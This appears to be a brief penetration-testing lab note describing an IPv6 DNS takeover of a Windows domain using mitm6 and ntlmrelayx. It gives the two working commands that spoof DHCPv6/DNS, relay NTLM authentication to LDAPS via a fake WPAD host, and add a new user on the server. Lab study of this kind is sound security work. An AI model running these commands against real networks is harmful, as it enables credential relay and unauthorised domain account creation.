# IPv6 DNS Takeover via mitm6

start windows server and 10 enterprise, also the attacker machine which have mitm6 installed.&#x20;

in attaker machine open two tabs let us mention them as x, y.

in x enter command&#x20;

ntlmrelayx.py -6 -t ldaps://IP\_ADDRESS\_of\_Win\_10 -wh fakewpad.EHP.com -l ByteMitm&#x20;

here ByteMitm is the file name

in y enter command&#x20;

sudo mitm6 -d EHP.com     (domain\_name)



run both command and wait till the process is done. when it is done it will add new user in the server.&#x20;





<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>



Alternative by Tie Guy

{% embed url="https://youtu.be/byGUT7TfWoU?si=FdZ5Ik9sj9wU6NNh" %}

{% embed url="https://youtu.be/u7HA7S9Og-Q?si=kxYB0jOyXNpqagvb" %}
